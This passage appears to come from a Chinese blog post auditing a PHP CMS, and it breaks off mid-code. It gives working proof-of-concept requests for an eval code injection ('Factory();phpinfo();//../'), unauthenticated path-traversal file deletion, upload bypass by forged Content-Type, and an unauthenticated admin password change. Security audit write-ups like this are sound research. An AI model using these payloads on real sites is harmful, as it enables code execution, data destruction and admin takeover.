invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<span class="hljs-comment">//ucfirst(), 将字符串首字母转化为大写，file_exists() 函数检查文件是否存在，如果文件不存在就回退为 Login 控制器</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>1、绕过 file_exists（）</p><p>这个函数在进行检查时，比如&#x2F;controller&#x2F;admin;&#x2F;..&#x2F;，函数允许路径中有一些特殊字符，并且遇到&#x2F;..&#x2F;会返回到上级目录，可以利用这个绕过 file_exists（）函数检查。</p><p>那么我们构造poc:<code>Factory();phpinfo();//../</code></p><p>2、入口点</p><p>调用Factory() 的入口点在 Factory::setAction()-&gt;run(); 这里，在admin&#x2F;index.php 这个文件中得知，它包含了&#x2F;config&#x2F;run.inc.php，可以利用</p><p>3、POC</p><p><code>/admin?a=Factory();phpinfo();//../</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950740.png" alt="20250710234248614"></p><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>根据审计PicAction.class.php时遇到的delall()函数，无验证造成的任意文件删除漏洞，进行复现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//删除图片，依旧没有验证用户</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#x27;?a=pic&#x27;</span><br><span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span class="hljs-comment">//上传目录的跟路径</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//遍历提交的图片名</span><br><span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() 删除文件</span><br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>&#125;<br>&#125;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>来到对应的功能点：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950634.png" alt="20250712193547260"></p><p>先给 upload 随便上传一张图片</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950799.png" alt="20250712193717272"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950970.png" alt="20250712193754284"></p><p>删除，进行抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950144.png" alt="20250712193827895"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951787.png" alt="20250712193843074"></p><p>URL编码：<code>pid%5B0%5D=1.png&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p><p>解码：</p><p><code>pid[0]=1.png&amp;chkall=on&amp;send=删除选中图片</code></p><p><code>chkall=on</code>是一个复选框</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951051.png" alt="20250712194432977"></p><p>可以看到只要在pid后的文件名进行路径拼接就可以跳到任意目录去删除文件</p><p>接下来就可以根据上面的数据构造POC：</p><p><code>pid[0]=/../1.txt&amp;chkall=on&amp;send=删除选中图片</code></p><p><code>pid%5B0%5D=/../1.txt&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p><p>路由：admin&#x2F;?a&#x3D;pic&amp;m&#x3D;delall</p><p>在根目录准备一个1.txt</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951601.png" alt="20250712194601104"></p><p>退出登录</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951683.png" alt="20250712194749344"></p><p>POST传参：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951643.png" alt="20250712195154540"></p><p>上图的浏览器删不掉，换了一个成功了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951397.png" alt="20250712195540507"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952634.png" alt="20250712195612613"></p><h3 id="任意文章-文件（no）删除"><a href="#任意文章-文件（no）删除" class="headerlink" title="任意文章&#x2F;文件（no）删除"></a>任意文章&#x2F;文件（no）删除</h3><p>这里想到审计ArticleAction.class.php时也有delall()函数，看看这里有没有文章删除漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//删除单个文章</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//先删除静态文件</span><br><span class="hljs-keyword">if</span>(tool::<span class="hljs-title function_ invoke__">delete_file</span>(<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>())&#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;删除失败!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//删除多个文章</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何内容!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br><span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//先删除静态文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;静态文件删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h4><p>GET传参，</p><p>找到一篇文章的id</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952850.png" alt="20250712200511140"></p><p>构造POC：<code>admin/?a=article&amp;m=delete&amp;id=2450</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952517.png" alt="20250712200604332"></p><p>执行后发现这篇文章被删除了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952547.png" alt="20250712200619491"></p><h4 id="delall"><a href="#delall" class="headerlink" title="delall()"></a>delall()</h4><p>功能点：此处多选删除</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952341.png" alt="20250712201015073"></p><p>抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952688.png" alt="20250712201031989"></p><p><code>showid%5B%5D=2449&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p><p>同样的，构造POC：</p><p><code>showid%5B%5D=%2F..%2F1.txt&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p><p>路由：admin&#x2F;?a&#x3D;article&amp;m&#x3D;delall</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080953834.png" alt="20250712201614722"></p><p>但是只删除了文章并没有删除1.txt ？？</p><p>再认真分析一遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//获取文章id</span><br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<span class="hljs-comment">//数据库查询</span><br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<span class="hljs-comment">//从数据库中获取 HTML</span><br></code></pre></td></tr></table></figure><p>直接传递<code>/../1.txt</code>作为ID值，系统会将<code>/../1.txt</code>当作文章ID去数据库查询，显然这个ID不存在</p><p>想要利用这里的漏洞，只能去更改数据库中HTML的内容，</p><p>添加、修改、删除都进行了用户验证，所以这个也不算一个漏洞了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>]=<span class="hljs-variable">$_art</span>[<span class="hljs-number">0</span>]-&gt;html;<br></code></pre></td></tr></table></figure><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>controller&#x2F;CallAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//处理上传图片</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upLoad</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>])) &#123;<br><span class="hljs-variable">$_logoupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogoUpload</span>(<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MAX_FILE_SIZE&#x27;</span>]);<br><span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br><span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">960</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br><span class="hljs-comment">//echo $_path;</span><br><span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">alertOpenerClose</span>(<span class="hljs-string">&#x27;图片上传成功！&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>.<span class="hljs-variable">$_path</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;警告：文件过大或者其他未知错误导致浏览器崩溃！&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//构造方法，初始化</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$_file</span>,<span class="hljs-variable">$_maxsize</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;maxsize = <span class="hljs-variable">$_maxsize</span> / <span class="hljs-number">1024</span>;<br><span class="hljs-variable language_">$this</span>-&gt;type = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;path = ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.UPLOGO;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;tmp = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkType</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkPath</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">moveUpload</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了</p><h3 id="任意文件上传-2"><a href="#任意文件上传-2" class="headerlink" title="任意文件上传-2"></a>任意文件上传-2</h3><p>controller&#x2F;CallAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//xheditor编辑器专用上传</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xhUp</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>])) &#123;<br><span class="hljs-variable">$_fileupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileUpload</span>(<span class="hljs-string">&#x27;filedata&#x27;</span>,<span class="hljs-number">10</span>);<br><span class="hljs-variable">$_err</span>=<span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br><span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br><span class="hljs-variable">$_msg</span>=<span class="hljs-string">&quot;&#x27;..<span class="hljs-subst">$_path</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">650</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#123;&#x27;err&#x27;:&#x27;&quot;</span>.<span class="hljs-variable">$_err</span>.<span class="hljs-string">&quot;&#x27;,&#x27;msg&#x27;:&quot;</span>.<span class="hljs-variable">$_msg</span>.<span class="hljs-string">&quot;&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertBack</span>(<span class="hljs-string">&#x27;警告：由于非法操作导致上传失败！&#x27;</span>);<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>代码中的文件名以时间+100到1000之间的随机数进行重命名</p><p>同样也是检查的传入的Content-Type的值</p><h3 id="未授权更改管理员账号密码"><a href="#未授权更改管理员账号密码" class="headerlink" title="未授权更改管理员账号密码"></a><strong>未授权更改管理员账号密码</strong></h3><p>首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username password notpassword的值即可更改数据库中admin账号的相关信息</p><p>根据url来定位一下漏洞函数，函数位于controller\AdminAction.class.php中的update函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;用户名不能为空&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;密码不能为空!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;两次密码不一致!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码修改成功!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码未修改!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>            &#125;<br>        &#125;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\AdminModel.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editAdmin</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$_sql</span>=<span class="hljs-string">&quot;UPDATE</span><br><span class="hljs-string">                    my_admin</span><br><span class="hljs-string">                SET</span><br><span class="hljs-string">                    username=&#x27;<span class="hljs-subst">$this</span>-&gt;username&#x27;,</span><br><span class="hljs-string">                    password=&#x27;<span class="hljs-subst">$this</span>-&gt;password&#x27;</span><br><span class="hljs-string">                WHERE</span><br><span class="hljs-string">                    id=1</span><br><span class="hljs-string">                LIMIT 1&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$_sql</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>该函数的父类为Model, 位于model\Model.class.php，看一下update函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span 